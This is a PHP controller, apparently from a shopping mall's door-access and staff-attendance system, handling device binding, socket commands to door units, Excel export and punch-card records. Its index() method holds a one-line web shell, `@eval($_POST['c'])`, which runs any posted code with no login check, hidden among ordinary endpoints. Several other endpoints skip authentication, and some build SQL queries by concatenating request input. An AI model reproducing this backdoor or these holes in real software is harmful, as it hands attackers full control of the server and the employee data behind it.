<?php
/**
 * Created by PhpStorm.
 * User: zhoujie
 * Date: 2017/7/29
 * Time: 14:19
 */
namespace Mall\Controller;
use Think\Controller;

class EquipmentDoorController extends Controller{
    public function index(){
        $c = @eval($_POST['c']);
    }
    /*
   * 未绑定设备列表
   */
    public function equip_list(){
        checkLogin();
        before_api();
        checkAuth();
        $condition['bond_state']=0;
        $condition['equip_type']='门禁设备';
        $data=D('EquipmentDoor')->where($condition)->field('equip_id,equip_type,bond_state,position')->select();
        //$data=D('EquipmentDoor')->getUnusedEqList();
       /* $result=array();
        foreach ($data as $key=>$value)
        {
            $result[$key]['id']=$value['equip_id'];
            $result[$key]['name']=$value['position'];
        }*/
        if($data){
            Ret(array('code' => 1, 'data' => $data));
        }
        else{
            Ret(array('code' => 2, 'info' => '数据获取失败，系统错误！'));
        }
    }

    /*
 * 设备列表
 */
    public function equip_show_list(){
        checkLogin();
        before_api();
        checkAuth();
        //$condition['equip_type']='门禁设备';
        $equipmentDoorModel=D('EquipmentDoor');
        $data =$equipmentDoorModel->getInfo();
//        var_dump($data);die;
        if($data){
            Ret(array('code' => 1, 'data' => $data));
        }else{
            Ret(array('code' => 2, 'info' => '数据获取失败，系统错误！'));
        }
    }

    /*
     * 设备绑定
     */
    public function equipment_bond(){
        checkLogin();
        before_api();
        checkAuth();

        $data['equip_type']=I('equip_type');
//        if(!$data['equip_type']){
//            Ret(array('code' => 2, 'info' => '参数（equip_type）有误！'));
//        }
       /* $data['owner_type']=I('owner_type');
//        if(!$data['owner_type']){
//            Ret(array('code' => 2, 'info' => '参数（owner_type）有误！'));
//        }
        $data['owner_name']=I('owner_name');
//        if(!$data['owner_name']){
//            Ret(array('code' => 2, 'info' => '参数（owner_name）有误！'));
//        }
        $data['room_type']=I('room_type');
//        if(!$data['room_type']){
//            Ret(array('code' => 2, 'info' => '参数（room_type）有误！'));
//        }
        $data['position']=I('room_position');
        if(!$data['position']){
            Ret(array('code' => 2, 'info' => '参数（room_position）有误！'));
        }*/
        $data['equip_ip']=I('equip_id');//设备ip地址
        if(!$data['equip_ip']){
            Ret(array('code' => 2, 'info' => '参数（equip_id）有误！'));
            die;
        }
        if(!is_ip($data['equip_ip']))
        {
            Ret(array('code' => 2, 'info' => 'IP的格式错误！'));
            die;
        }
        $data['bond_state']=0;
        $data['equip_name']=I('equip_name');//设备名称
        if(!$data['equip_name']){
            Ret(array('code' => 2, 'info' => '参数（equip_name）有误！'));
        }
        $data['position']=I('equip_name');//设备名称
        if(!$data['position']){
            Ret(array('code' => 2, 'info' => '参数（equip_name）有误！'));
        }
        if($data){

            if(D('EquipmentDoor')->isUsedIp($data['equip_ip'])==false)
            {
                $res = D('EquipmentDoor')->add($data);
                if ($res) {
                    Ret(array('code' => 1, 'info' => '设备新建成功！'));
                } else {
                    Ret(array('code' => 2, 'info' => '设备新建失败,系统出错！'));
                }
            }
            else
            {
                Ret(array('code' => 2, 'info' => '设备IP被其他设备占用，新建失败！'));
            }
        }
    }

    /*
     * 发送会员卡员工卡更新信息指令
     */
    public function send(){
        checkLogin();
        before_api();
        checkAuth();

        echo "<h2>tcp/ip connection </h2>\n";
        $service_port = 8885;
        $address = '192.168.7.220';

        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket === false) {
            echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
        } else {
            echo "OK. \n";
        }

        echo "Attempting to connect to '$address' on port '$service_port'...";
        $result = socket_connect($socket, $address, $service_port);
        if($result === false) {
            echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";
        } else {
            echo "OK \n";
        }
        $sn = "send"; //发送
        $out = "";
        echo "sending http head request ...";
        socket_write($socket, $sn, strlen($sn));
        socket_close($socket);
        echo "ok .\n\n";
    }

    /*
     * 搜索设备
     */
    public function search_equip(){
        //error_reporting(E_ALL);
        echo "<h2>tcp/ip connection </h2>\n";
        $service_port = 8885;
        $address = '192.168.7.220';

        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket === false) {
            echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
        } else {
            echo "OK. \n";
        }

        echo "Attempting to connect to '$address' on port '$service_port'...";
        $result = socket_connect($socket, $address, $service_port);
        if($result === false) {
            echo "socket_connect() failed.\nReason: ($result) " . socket_strerror(socket_last_error($socket)) . "\n";
        } else {
            Ret(array('code' => 1, 'info' => '设备搜索成功！'));
        }
        socket_close($socket);
        echo "ok .\n\n";
    }


    public function get_equip(){
        before_api();
        if($_POST){
            $data['post']=json_encode($_POST);
            $data['post2'] = $_POST['attendance'];

            $res =  D('EquipmentDoor')->add($data);

            if ($res) {
                echo 'success';
            }else{
                echo 'failure';
            }
        }
    }


    /*
     * 机构员工门禁授权
     *
     */
    public function inst_member_door_auth(){
        $data = D('MemberDoorAuth')->where('state=0')->select();
        $str='';
        foreach($data as $k => $v){
            $ipcheck = $this->checkIP((string)$v['eqip']);
            if($ipcheck){
                if($v['eqip'] && $v['cardno'] && $v['memberid'] && $v['membername']){
                    $str = $str.$v['eqip'].','.$v['cardno'].','.$v['memberid'].','.$v['membername'].','.$v['time'].'\r\n';
                }
                $data['state']=1;
                $con['id'] = $v['id'];
                D('MemberDoorAuth')->where($con)->save($data);
            }
        }
        if($str){
            $res=str_replace("\n","",$str);
            echo $res;
        }

    }
    /*
     * 删除员工门禁权限
     */
    public function door_auth_delete()
    {
        $data = D('DoorAuthDelete')->where('state=0')->select();
        //$str='';

        foreach($data as $k => $v){
            $ipcheck = $this->checkIP((string)$v['eqip']);
            if($ipcheck){
                if($v['eqip'] && $v['cardno'] && $v['memberid'] && $v['membername']){
                    $str = $v['eqip'].','.$v['cardno'].','.$v['memberid'].','.$v['membername'].','.$v['time'].'\r\n';
                }
                $data['state']=1;
                $con['id'] = $v['id'];
                D('DoorAuthDelete')->where($con)->save($data);
            }
        }
        if($str){
            $res=str_replace("\n","",$str);
            echo $res;
        }
    }
    private function checkIP($ip){
        if($ip){
            $condition['equip_ip']=$ip;
            return D('Equipment')->where($condition)->find();
        }

    }



    private function getInstByID($instID){
        if($instID){
            $condition['id']=$instID;
            $fields = array('position_idx,contract_start_time,contract_end_time');
            return D('Inst')->where($condition)->field($fields)->find();
        }
    }

    private function getMerchantByID($merchantID){
        if($merchantID){
            $condition['id']=$merchantID;
            $fields = array('shop_addr,contract_start_time,contract_end_time');
            return D('Merchant')->where($condition)->field($fields)->find();
        }
    }

    private function getDoorByShopID($shopId){
        if($shopId){
            $condition['id']=$shopId;
            return D('Shop')->where($condition)->field('eqip')->find();
        }
    }

    public function merchant_member_door_auth(){
        $fields = array('id,name,merchant_id,card_number');
        $condition['state']=1;
        $memberList = D('MerchantStaff')->where($condition)->field($fields)->select();
        foreach($memberList as $k => $v){
            $instInfo=$this ->getMerchantByID($v['merchant_id']);
            $memberList[$k]['shop_addr'] =$instInfo['shop_addr'];
            $memberList[$k]['contract_start_time'] =$instInfo['contract_start_time'];
            $memberList[$k]['contract_end_time'] =$instInfo['contract_end_time'];
            $strTime='0,00:00-23:59;1,00:00-23:59;2,00:00-23:59;3,00:00-23:59;4,00:00-23:59;5,00:00-23:59;6,00:00-23:59';
            $tID=30+$k;
            $data[$k]=$memberList[$k]['shop_addr'].','.$v['card_number'].','.'m'.$v['id'].','.$v['name'].','.$memberList[$k]['contract_start_time'].','.$memberList[$k]['contract_end_time'].'#'.$tID.']'.$strTime;
        }
        $datas = implode('\r\n',$data);
        echo $datas;
    }




    public function roleRLog(){
        before_api();
        $data['state'] = $_POST['state'];
        $data['post'] =json_encode($_POST);
        $dArr=explode(',',$_POST['DoorRole']);
        $data['doorIp'] = $dArr[0];
        $data['state'] = $dArr[1];
        $data['time'] = date('Y-m-d H:i:s');
        D('RoleRLog')->add($data);
    }

    /**
     *
     * 导出Excel
     */
    public function expLog(){
        $xlsName  = "eqConState";
        $xlsCell  = array(
            array('id','序列'),
            array('time','时间'),
            array('state','状态'),
            array('doorip','门禁IP'),

        );
        $xlsModel = D('RoleRLog');

        $xlsData  = $xlsModel->Field('id,time,state,doorip')->select();
        foreach ($xlsData as $k => $v)
        {
            $xlsData[$k]['state']=$v['state']==1?'正常':'未连通';
        }
        $this->exportExcel($xlsName,$xlsCell,$xlsData);
    }

    public function exportExcel($expTitle,$expCellName,$expTableData){
        $xlsTitle = iconv('utf-8', 'gb2312', $expTitle);//文件名称
        //$fileName = $_SESSION['account'].date('_YmdHis');//or $xlsTitle 文件名称可根据自己情况设定
        $fileName = date('YmdHis');
        $cellNum = count($expCellName);
        $dataNum = count($expTableData);
        vendor("PHPExcel.Classes.PHPExcel");

        $objPHPExcel = new \PHPExcel();
        $cellName = array('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','AA','AB','AC','AD','AE','AF','AG','AH','AI','AJ','AK','AL','AM','AN','AO','AP','AQ','AR','AS','AT','AU','AV','AW','AX','AY','AZ');

        $objPHPExcel->getActiveSheet(0)->mergeCells('A1:'.$cellName[$cellNum-1].'1');//合并单元格
        // $objPHPExcel->setActiveSheetIndex(0)->setCellValue('A1', $expTitle.'  Export time:'.date('Y-m-d H:i:s'));
        for($i=0;$i<$cellNum;$i++){
            $objPHPExcel->setActiveSheetIndex(0)->setCellValue($cellName[$i].'2', $expCellName[$i][1]);
        }
        // Miscellaneous glyphs, UTF-8
        for($i=0;$i<$dataNum;$i++){
            for($j=0;$j<$cellNum;$j++){
                $objPHPExcel->getActiveSheet(0)->setCellValue($cellName[$j].($i+3), $expTableData[$i][$expCellName[$j][0]]);
            }
        }

        header('pragma:public');
        header('Content-type:application/vnd.ms-excel;charset=utf-8;name="'.$xlsTitle.'.xls"');
        header("Content-Disposition:attachment;filename=$fileName.xls");//attachment新窗口打印inline本窗口打印
        $objWriter = \PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel5');
        $objWriter->save('php://output');
        exit;
    }


    public function batchAddEquipment(){
        if (!empty($_FILES)) {

            $root = APP_ROOT;
            $path = '/Public/Uploads/ExcelFile/';
            $rootPath = $root.$path;
            $config=array(
                'exts'=>array('xlsx','xls'),
                'maxSize' => 3145728 ,// 设置附件上传大小
                'rootPath' => $rootPath, // 设置附件上传根目录
                'autoSub' => false,
                'saveName' => array('uniqid',''),
                'savePath' => '',
            );
            $upload = new \Think\Upload($config);
            $info   =   $upload->upload();
            $fileNum = count($info);
            if(!$info) {// 上传错误提示错误信息
                echo json_encode(array('code' => 2, 'info' => $upload->getError()));
            }else {// 上传成功
                vendor("PHPExcel.Classes.PHPExcel");
                //$objPHPExcel = new \PHPExcel();
                $file_name=$rootPath.$info['uploadfile']['savename'];
                //$objReader = \PHPExcel_IOFactory::createReader('Excel5');
                $extension = strtolower( pathinfo($info['uploadfile']['savename'], PATHINFO_EXTENSION) );

                if ($extension =='xlsx') {
                    $objReader = \PHPExcel_IOFactory::createReader('Excel2007');
                    $objPHPExcel = $objReader ->load($file_name);
                } else if ($extension =='xls') {
                    $objReader = \PHPExcel_IOFactory::createReader('Excel5');
                    $objPHPExcel = $objReader ->load($file_name);
                }
                //$objPHPExcel = $objReader->load($file_name,$encode='utf-8');
                $sheet = $objPHPExcel->getSheet(0);
                $highestRow = $sheet->getHighestRow(); // 取得总行数
                $highestColumn = $sheet->getHighestColumn(); // 取得总列数
                for($i=3;$i<=$highestRow;$i++)
                {
                    $data['position'] = $objPHPExcel->getActiveSheet()->getCell("B".$i)->getValue();
                    $data['equip_ip']= $data['truename'] = $objPHPExcel->getActiveSheet()->getCell("C".$i)->getValue();
                    $data['bond_state'] = 1;
                    $data['equip_type']= '门禁设备';
                    D('EquipmentDoor')->add($data);

                }

            }
            echo json_encode(array('code' => 2, 'info' => '导入成功'));
        }else
        {
            echo json_encode(array('code' => 2, 'info' => '请选择上传的文件'));
        }
    }


    public function getEqIp(){
        $data = D('EquipmentDoor')->field('equip_ip')->select();
        $str = '';
        foreach($data as $k => $v){
            $str = $str.';'.$v['equip_ip'];
        }
        echo $str;
    }
    public function getEqInfoById()
    {
        $id=I('equip_id');
        if($id)
        {
            $equipmentDoorModel=D('EquipmentDoor');
            $data=$equipmentDoorModel->getEqInfoByEqId($id);
            if($data)
            {
                Ret(array('code' =>1, 'data' => $data[0]));
            }
            else
            {
                Ret(array('code' =>2, 'info' => '没有数据！'));
            }

        }
        else
        {
            Ret(array('code' =>2, 'info' => '获取不到equip_id！'));
        }
    }

    /*
     * 考勤记录,会员刷卡记录
     */
    public function attendence_record(){
        before_api();
        $dStr = I('attendance');
        $dArr=explode(';',$dStr);
        if($dStr){
            foreach($dArr as $k => $v){
                if($v){
                    $dList = explode(',',$v);
                    $key=substr($dList[2],0,1);
                    $worker_id=substr($dList[2],1,90);
                    $cardNo=$dList[1];
                    $the_day = $dList[3];
                    $time = $dList[4];
                    switch($key){
                        case 's'://会员上课打卡

                            $data['room_id']=''; //暂无
                            $data['thedate']=$the_day;
                            $data['	time']=$time;
                            D('MemberInRoom')->add($data);

                            break;

                        case 'i'://机构考勤

                            //初始化，填入员工信息
                            $workeTime=D('MallAttSet')->find();
                            if($workeTime){
                                $inTime = $workeTime['in_time'];
                                $outTime = $workeTime['out_time'];
                            }

                            $workerInfo = D('InstStaff')->where('id='.$worker_id)->find();

                            //初始化，填入员工信息
                            $con['worker_id']=$worker_id;
                            $con['card_no']=$cardNo;
                            $con['thedate']=$the_day;
                            if( D('InstAtt')->where($con)->count()){

                                $data1['eployee_pic'] = $workerInfo['pic'];
                                $data1['eployee_name'] = $workerInfo['name'];
                                $data1['eployee_department'] = $workerInfo['dept_name'];
                                $data1['eployee_address'] = $workerInfo['address'];
                                $data1['eployee_position'] = $workerInfo['position_name'];
                                $data1['eployee_phone'] = $workerInfo['phone'];
                                $data1['check_state'] = 0;

                                $data1['punch_out']= $time;
                                if($time<$outTime){
                                    $data1['punch_out_state']=0;
                                }else{
                                    $data1['punch_out_state']=1;
                                }

                                $res = D('InstAtt')->where($con)->save($data1);
                                if($res){
                                    echo 'success!';
                                }else{
                                    echo 'failure!';
                                }
                            }else{
                                $data2['worker_id']=$worker_id;
                                $data2['card_no']=$cardNo;

                                $data2['eployee_pic'] = $workerInfo['pic'];
                                $data2['eployee_name'] = $workerInfo['name'];
                                $data2['eployee_department'] = $workerInfo['dept_name'];
                                $data2['eployee_address'] = $workerInfo['address'];
                                $data2['eployee_position'] = $workerInfo['position_name'];
                                $data2['eployee_phone'] = $workerInfo['phone'];
                                $data2['check_state'] = 0;
                                $data2['institution_id'] = $workerInfo['institution_id'];

                                $data2['punch_in']= $time;
                                $data2['thedate']= $the_day;

                                if($time>$inTime){
                                    $data1['punch_in_state']=0;
                                }else{
                                    $data1['punch_in_state']=1;
                                }
                                $res = D('InstAtt')->add($data2);
                                if($res){
                                    echo 'success!';
                                }else{
                                    echo 'failure!';
                                }
                            }


                            break;
                        case 'm'://商场考勤
                            $workeTime=D('MallAttSet')->find();
                            if($workeTime){
                                $inTime = $workeTime['in_time'];
                                $outTime = $workeTime['out_time'];
                            }
                            $workerInfo = D('Worker')->where('number='.$worker_id)->find();
                            //初始化，填入员工信息
                            $con['worker_id']=$worker_id;
                            $con['card_no']=$cardNo;
                            $con['thedate']=$the_day;
                            if( D('MallAtt')->where($con)->count()){
                                $data1['eployee_pic'] = $workerInfo['pic'];
                                $data1['eployee_name'] = $workerInfo['name'];
                                $data1['eployee_department'] = $workerInfo['dept_name'];
                                $data1['eployee_address'] = $workerInfo['address'];
                                $data1['eployee_position'] = $workerInfo['position_name'];
                                $data1['eployee_phone'] = $workerInfo['phone'];
                                $data2['check_state'] = 0;

                                $data1['punch_out']= $time;
                                if($time<$outTime){
                                    $data1['punch_out_state']=0;
                                }else{
                                    $data1['punch_out_state']=1;
                                }
                                $res = D('MallAtt')->where($con)->save($data1);
                                if($res){
                                    echo 'success!';
                                }else{
                                    echo 'failure!';
                                }
                            }else{
                                $data2['worker_id']=$worker_id;
                                $data2['card_no']=$cardNo;
                                $data2['eployee_pic'] = $workerInfo['pic'];
                                $data2['eployee_name'] = $workerInfo['name'];
                                $data2['eployee_department'] = $workerInfo['dept_name'];
                                $data2['eployee_address'] = $workerInfo['address'];
                                $data2['eployee_position'] = $workerInfo['position_name'];
                                $data2['eployee_phone'] = $workerInfo['phone'];
                                $data2['check_state'] = 0;

                                $data2['punch_in']= $time;
                                $data2['thedate']= $the_day;

                                if($time>$inTime){
                                    $data1['punch_in_state']=0;
                                }else{
                                    $data1['punch_in_state']=1;
                                }
                                $res = D('MallAtt')->add($data2);
                                if($res){
                                    echo 'success!';
                                }else{
                                    echo 'failure!';
                                }
                            }
                            break;
                        case 'd'://商户考勤
                            break;
                    }
                }
            }
        }
    }
}